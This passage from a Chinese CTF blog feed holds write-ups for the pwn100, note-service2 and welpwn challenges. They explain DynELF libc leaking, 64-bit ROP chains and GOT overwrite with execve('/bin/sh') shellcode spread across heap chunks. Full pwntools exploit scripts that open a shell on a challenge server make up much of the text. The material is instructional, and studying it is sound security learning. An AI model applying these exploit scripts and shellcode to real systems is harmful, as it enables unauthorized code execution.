<span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">+=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>会发现这样的exp打不通</strong></p><h3 id="0x03-寻找原因"><a href="#0x03-寻找原因" class="headerlink" title="0x03.寻找原因"></a>0x03.寻找原因</h3><p><strong>原因出在了leak函数上</strong></p><blockquote><p>puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p></blockquote><h3 id="0x04-利用puts函数的DynELF模板"><a href="#0x04-利用puts函数的DynELF模板" class="headerlink" title="0x04.利用puts函数的DynELF模板"></a>0x04.利用puts函数的DynELF模板</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  count <span class="token operator">=</span> <span class="token number">0</span>  data <span class="token operator">=</span> <span class="token string">""</span>  payload <span class="token operator">=</span> xxx  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一定要在puts前释放完输出</span>  up <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">"x"</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#一定要找到泄漏信息的字符串特征</span>      data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                           data <span class="token operator">+=</span> <span class="token string">"x00"</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      buf <span class="token operator">+=</span> c    up <span class="token operator">=</span> c  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x05-调整exp"><a href="#0x05-调整exp" class="headerlink" title="0x05.调整exp"></a>0x05.调整exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#每次读取一个字节，设置超时时间确保没有遗漏</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> up <span class="token operator">==</span><span class="token string">'\n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#上一个字符是回车且读不到其他字符，说明读完了</span>            content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token comment" spellcheck="true">#最后一个字符设置为\x00</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            content <span class="token operator">+=</span> c <span class="token comment" spellcheck="true">#输出拼接</span>            up <span class="token operator">=</span> c <span class="token comment" spellcheck="true">#保存最后一个字符</span>    content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#截取输出的一段作为返回值，提供给DynELF处理</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>要认识到32位程序和64位程序传参的区别</p></li><li><p>要学会熟练使用DynELF应对可重复泄露的漏洞</p><p>参考博客：<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">【技术分享】借助DynELF实现无libc的漏洞利用小结</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;highlight=pwn" target="_blank" rel="noopener">Linux pwn入门教程(5)——利用漏洞获取libc </a></p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆指针越界&amp;堆上布置shellcode|攻防世界pwn进阶区 note-service2</title>
      <link href="/2020/03/21/shellcode/"/>
      <url>/2020/03/21/shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前CTF竞赛中，以堆为背景的pwn题已逐步成为了pwn类型题目中的主流，开始逐步接触堆题，本题涉及到在堆上布置shellcode，并利用堆指针使程序执行流得到控制。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200318115718392.jpg" alt=""></p><pre><code>Canary found：不能用溢出的方式控制程序执行NX disabled：堆栈上数据可执行PIE enabled：地址随机化开启</code></pre><h3 id="0x01-查看程序功能"><a href="#0x01-查看程序功能" class="headerlink" title="0x01.查看程序功能"></a>0x01.查看程序功能</h3><p><img src="https://img-blog.csdnimg.cn/20200318120153273.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><blockquote><p>一个简单的菜单题，add 和 del可以用，show和edit功能不可用</p></blockquote><h3 id="0x02-ida查看逻辑"><a href="#0x02-ida查看逻辑" class="headerlink" title="0x02.ida查看逻辑"></a>0x02.ida查看逻辑</h3><p><img src="https://img-blog.csdnimg.cn/2020031812100961.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318121121612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>获得以下信息：</p><ul><li><strong>堆块最大为8字节，但是我们只能写入7字节的数据</strong></li><li><strong>堆指针的下标可以越界</strong><h3 id="0x03-利用思路"><a href="#0x03-利用思路" class="headerlink" title="0x03.利用思路"></a>0x03.利用思路</h3></li></ul><blockquote><p>（1）通过堆指针越界，把一些GOT表表项替换成堆指针<br>（2）因为NX 关闭，堆栈数据可以执行，直接在堆栈上布置shellcode<br>（3）每个堆块可以写入7个字节的数据，3个字节留作布置jmp short xxx（jmp short占两个字节，对应的机器码是\xeb，xxx对应1字节，且jmp short xxx是相对当前位置寻址），4个字节用于布置shellcode。<br>（4）要把shellcode分开布置在多个堆块上面。</p></blockquote><p>jmp short xxx 中，<strong>xxx=目标地址-当前地址-2</strong></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x00-选一段shellcode布置在堆上"><a href="#0x00-选一段shellcode布置在堆上" class="headerlink" title="0x00.选一段shellcode布置在堆上"></a>0x00.选一段shellcode布置在堆上</h3><pre><code>mov rdi, xxx   //xxx=&amp;("/bin/sh")  xor rsi,rsi   //rsi=0，实际可以是mov rsi, 0 但是mov这个命令太长了。下同。占2字节mov rax, 0x3b //rax=0x3b 占4字节xor rdx,rdx   //rdx=0 占2字节syscall //就是syscall调用execve("/bin/sh",0,0)</code></pre><p><strong>jmp short 占2个字节<br>jmp short xxx占3个字节</strong></p><h3 id="0x01-计算jmp-short指令要跳多少字节"><a href="#0x01-计算jmp-short指令要跳多少字节" class="headerlink" title="0x01.计算jmp short指令要跳多少字节"></a>0x01.计算jmp short指令要跳多少字节</h3><p><img src="https://img-blog.csdnimg.cn/20200318122408317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>从chunk0跳到chunk1，<br>==目标地址-当前地址=8+8+8+1+2=0x1B==<br>==xxx=0x1B-2=0x19==<br>即从当前chunk的jmp区跳到下一个chunk的data区，距离是0x19<br><strong>jmp short 0x19转换成机器码是 \xeb\x19</strong></p><h3 id="0x02-shellcode转换为asm格式"><a href="#0x02-shellcode转换为asm格式" class="headerlink" title="0x02.shellcode转换为asm格式"></a>0x02.shellcode转换为asm格式</h3><pre><code>asm("xor rsi,rsi")+"\x90\x90\xeb\x19"asm("mov rax,0x3b")+"\xeb\x19"asm("xor rdx,rdx")+"\x90\x90\xeb\x19"asm("syscall").ljust(7,"\x90")</code></pre><p><strong>我们无法写出 asm(“mov rdi,&amp;(“/bin/sh”)”)这样的指令</strong>,<strong>即不能把”/bin/sh”的地址直接传给rdi</strong></p><h3 id="0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi"><a href="#0x03-通过64位传参机制把-amp-“-bin-sh”-传到rdi" class="headerlink" title="0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi"></a>0x03.通过64位传参机制把&amp;(“/bin/sh”)传到rdi</h3><p>==由0x02知，我们不能直接把”/bin/sh”的地址给rdi==<br><strong>解决办法：</strong></p><ul><li>申请一个堆块A，把”/bin/sh”写到A上</li><li>调用free函数，把堆块A的内容（即”/bin/sh”地址）当作free函数的参数，因为第一个参数会传到rdi里面去，这样，rdi=&amp;(“/bin/sh”)</li><li>修改free函数的got表，使调用free函数之后的程序流转到我们布置shellcode的堆块上，依次执行shellcode<h3 id="0x04-计算free的got地址和堆数组静态地址的距离"><a href="#0x04-计算free的got地址和堆数组静态地址的距离" class="headerlink" title="0x04.计算free的got地址和堆数组静态地址的距离"></a>0x04.计算free的got地址和堆数组静态地址的距离</h3><img src="https://img-blog.csdnimg.cn/20200318124128459.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200318125038841.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>数组到free的got表的距离：<code>0x2020A0-0x202018=0x88</code><br><strong>0x88/8=17字节</strong><br><strong>即数组下标减17就来到了free的got表地址</strong></li></ul><h3 id="0x05-尝试写exp："><a href="#0x05-尝试写exp：" class="headerlink" title="0x05. 尝试写exp："></a>0x05. 尝试写exp：</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48323</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice>>"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span> <span class="token operator">//</span>申请堆块写入<span class="token string">'/bin/sh'</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rsi,rsi"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span> <span class="token operator">//</span>传入<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>并改写got表add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"mov eax,0x3b"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"xor rdx,rdx"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x90\x90\xeb\x19"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"\x90"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">//</span>系统调用<span class="token keyword">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">//</span>这一步我觉得应该是给syscall传参r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><br><a href="https://blog.csdn.net/qq_42728977/article/details/103914342" target="_blank" rel="noopener">攻防世界pwn之note-service</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/103003167" target="_blank" rel="noopener">攻防世界PWN之note-service2题解</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入探究64位rop链构造，wp中常见的万能gadgets详解_ 攻防世界pwn进阶区welpwn</title>
      <link href="/2020/03/21/rop/"/>
      <url>/2020/03/21/rop/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题做的时间跨度比较长了，断断续续做了一天多，然后尝试了两种方式，一种是DynELF泄露system地址，还有一种是利用python的LibcSearcher模块得到libc偏移再进一步获取system的libc地址。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200320190823909.jpg" alt=""><br><strong>感觉是栈溢出然后构造ROP来getshell。</strong></p><h3 id="0x01-找到溢出点"><a href="#0x01-找到溢出点" class="headerlink" title="0x01.找到溢出点"></a>0x01.找到溢出点</h3><p><img src="https://img-blog.csdnimg.cn/20200320191121171.jpg" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191156122.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>read函数是不能溢出的，进echo函数查看，发现echo函数开辟的大小只有0x20，<strong>但是buf可以写入的有0x400字节，buf复制到echo，显然可以发生溢出。</strong><br><strong>利用cyclic计算得出溢出需要24字节。</strong></p><h3 id="0x02-跳过echo在buf上构造rop"><a href="#0x02-跳过echo在buf上构造rop" class="headerlink" title="0x02.跳过echo在buf上构造rop"></a>0x02.跳过echo在buf上构造rop</h3><p>我们可以发现在echo函数内部，有一个循环判断，a1[i]!=’\x00’，否则会发生截断。但是构造rop需要传递地址，一般都会有’\x00’存在，故不能直接构造rop。<br><img src="https://img-blog.csdnimg.cn/20200320191852756.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191908900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" 